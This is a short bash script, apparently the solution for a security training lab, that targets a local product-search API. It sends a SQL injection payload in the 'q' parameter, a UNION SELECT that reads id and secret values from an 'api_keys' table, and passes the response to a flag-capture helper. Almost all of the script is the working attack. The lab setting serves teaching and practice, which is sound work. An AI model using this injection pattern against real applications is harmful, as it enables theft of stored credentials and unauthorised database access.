#!/usr/bin/env bash
# Lab 12 — three columns come back, so three columns go in.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9120}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab12

open_lab "$SESSION" "$URL/api/products?q=compass"
send "$SESSION" "$REQ0" \
    --set "query.q=zz%' UNION SELECT id, secret, 0 FROM api_keys -- " | flag
